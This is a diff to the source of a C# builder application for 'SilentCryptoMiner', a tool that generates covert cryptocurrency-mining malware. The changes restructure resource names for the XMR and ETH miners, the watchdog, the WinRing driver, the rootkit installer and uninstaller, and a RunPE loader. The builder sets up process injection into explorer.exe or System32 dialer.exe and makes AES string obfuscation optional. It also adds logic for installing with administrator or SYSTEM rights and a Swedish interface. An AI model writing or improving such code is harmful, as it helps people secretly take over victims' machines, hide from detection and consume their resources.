@@ -7,7 +7,8 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
-using FormSerialisation;
+using FormSerialization;
+using FormLocalization;
 
 namespace SilentCryptoMiner
 {
@@ -28,6 +29,8 @@ namespace SilentCryptoMiner
         public string advancedParamsETH = "";
         public byte[] watchdogdata = new byte[] { };
         public List<string> randomiCache = new List<string>();
+        public string installPathCache = "AppData";
+        public string currentLanguage = "en";
 
         public List<string> fullnids = new List<string>();
 
@@ -44,22 +47,14 @@ namespace SilentCryptoMiner
         public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
         public string UNAMIV = "UUCommandULineUU";
 
-        public string Resources_xmr;
-        public string Resources_eth;
-        public string Resources_libs;
-        public string Resources_watchdog;
-        public string Resources_winring;
-        public string Resources_rootkiti;
-        public string Resources_rootkitu;
-        public string Resources_runpe;
-        public string Resources_parent;
+        public Dictionary<string, string> resources = new Dictionary<string, string>();
 
         public string minerFind;
         public string watchdogID;
         public string eid;
         public string xid;
 
-        public string builderVersion = "2.4.1";
+        public string builderVersion = "2.5.0";
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -122,15 +117,16 @@ namespace SilentCryptoMiner
                 minerFind = Randomi(rand.Next(8, 16));
                 watchdogID = Randomi(rand.Next(8, 16));
 
-                Resources_xmr = Randomi(rand.Next(5, 20));
-                Resources_eth = Randomi(rand.Next(5, 20));
-                Resources_libs = Randomi(rand.Next(5, 20));
-                Resources_watchdog = Randomi(rand.Next(5, 20));
-                Resources_winring = Randomi(rand.Next(5, 20));
-                Resources_rootkiti = Randomi(rand.Next(5, 20));
-                Resources_rootkitu = Randomi(rand.Next(5, 20));
-                Resources_runpe = Randomi(rand.Next(5, 20));
-                Resources_parent = Randomi(rand.Next(5, 20));
+                resources.Clear();
+                resources.Add("xmr", Randomi(rand.Next(5, 20)));
+                resources.Add("eth", Randomi(rand.Next(5, 20)));
+                resources.Add("libs", Randomi(rand.Next(5, 20)));
+                resources.Add("watchdog", Randomi(rand.Next(5, 20)));
+                resources.Add("winring", Randomi(rand.Next(5, 20)));
+                resources.Add("rootkit_i", Randomi(rand.Next(5, 20)));
+                resources.Add("rootkit_u", Randomi(rand.Next(5, 20)));
+                resources.Add("runpe", Randomi(rand.Next(5, 20)));
+                resources.Add("parent", Randomi(rand.Next(5, 20)));
 
                 StringBuilder minerbuilder = new StringBuilder(Properties.Resources.Program);
 
@@ -228,8 +224,8 @@ namespace SilentCryptoMiner
 
                     string minerid = $"{minerFind}{(xmr ? xid : eid)}{miner.nid} ";
                     string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
-                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\"}}", EncryptString(minerid), xmr ? xid : eid, EncryptString(minerid + Unamlib_Encrypt(argstr.ToString())), EncryptString(FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
-                    fullnids.Add(string.Format("new string[] {{\"{0}\",\"{1}\"}}", EncryptString(minerid), xmr ? xid : eid));
+                    minerSet.Add(string.Format("new string[] {{\"{0}\",\"{1}\",\"{2}\",\"{3}\"}}", minerid, xmr ? xid : eid, minerid + Unamlib_Encrypt(argstr.ToString()), EncryptString(FormAO.toggleRootkit.Checked ? "System32\\dialer.exe" : (injectionTarget != "explorer.exe" ? "System32\\" : "") + injectionTarget)));
+                    fullnids.Add(string.Format("new string[] {{\"{0}\",\"{1}\"}}", minerid, xmr ? xid : eid));
                 }
 
                 minerbuilder.Replace("MINERSET", string.Join(",", minerSet));
@@ -348,6 +344,11 @@ namespace SilentCryptoMiner
 
         public byte[] AES_Encryptor(byte[] input)
         {
+            if (!FormAO.toggleDoObfuscation.Checked)
+            {
+                return input;
+            }
+
             using (Aes aesAlg = Aes.Create())
             {
                 ICryptoTransform encryptor = aesAlg.CreateEncryptor(new Rfc2898DeriveBytes(AESKEY, Encoding.ASCII.GetBytes(SALT), 100).GetBytes(16), Encoding.ASCII.GetBytes(IV));
@@ -365,7 +366,37 @@ namespace SilentCryptoMiner
 
         public string EncryptString(string input)
         {
-            return Convert.ToBase64String(AES_Encryptor(Encoding.Unicode.GetBytes(input)));
+            if (!FormAO.toggleDoObfuscation.Checked)
+            {
+                return ToLiteral(input);
+            }
+
+            return Convert.ToBase64String(AES_Encryptor(Encoding.UTF8.GetBytes(input)));
+        }
+
+        public string ToLiteral(string input)
+        {
+            var literal = new StringBuilder(input.Length + 2);
+            foreach (var c in input)
+            {
+                switch (c)
+                {
+                    case '\"': literal.Append("\\\""); break;
+                    case '\\': literal.Append(@"\\"); break;
+                    case '\0': literal.Append(@"\u0000"); break;
+                    case '\a': literal.Append(@"\a"); break;
+                    case '\b': literal.Append(@"\b"); break;
+                    case '\f': literal.Append(@"\f"); break;
+                    case '\n': literal.Append(@"\n"); break;
+                    case '\r': literal.Append(@"\r"); break;
+                    case '\t': literal.Append(@"\t"); break;
+                    case '\v': literal.Append(@"\v"); break;
+                    default:
+                        literal.Append(c);
+                        break;
+                }
+            }
+            return literal.ToString();
         }
 
         public bool BuildError(bool condition, string message)
@@ -658,6 +689,19 @@ namespace SilentCryptoMiner
             }
         }
 
+        public void TranslateForms()
+        {
+            Dictionary<string, string> languages = new Dictionary<string, string>() { { "English", "en" }, { "Swedish", "sv" } };
+            currentLanguage = languages[comboLanguage.Text];
+
+            var list = new List<Control>() { this, FormAO, FormAS };
+            foreach(var item in listMiners.Items)
+            {
+                list.Add((dynamic)item);
+            }
+            FormLocalizer.TranslateControls(list, Properties.Resources.LocalizedControls, currentLanguage);
+        }
+
         private void btnSaveState_Click(object sender, EventArgs e)
         {
             string savepath = SaveDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
@@ -676,6 +720,8 @@ namespace SilentCryptoMiner
                 {
                     FormSerializer.Deserialise(new List<Control>() { this, FormAO }, loadpath);
                     ReloadMinerList();
+                    InstallPathCheck();
+                    TranslateForms();
                     try
                     {
                         if (File.Exists(txtIconPath.Text))
@@ -691,9 +737,39 @@ namespace SilentCryptoMiner
             }
         }
 
+        public void InstallPathCheck()
+        {
+            if (toggleAdministrator.Checked && toggleRunSystem.Checked)
+            {
+                installPathCache = txtInstallPath.Text;
+                txtInstallPath.Items[txtInstallPath.SelectedIndex] = "Program Files";
+                txtInstallPath.Enabled = false;
+            }
+            else
+            {
+                txtInstallPath.Items[txtInstallPath.SelectedIndex] = installPathCache;
+                txtInstallPath.Enabled = chkInstall.Checked;
+            }
+        }
+
         private void chkBlockWebsites_CheckedChanged(object sender)
         {
             txtBlockWebsites.Enabled = chkBlockWebsites.Checked;
+        }
+
+        private void toggleAdministrator_CheckedChanged(object sender)
+        {
+            InstallPathCheck();
+        }
+
+        private void toggleRunSystem_CheckedChanged(object sender)
+        {
+            InstallPathCheck();
+        }
+
+        private void comboLanguage_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            TranslateForms();
         }
     }
 }
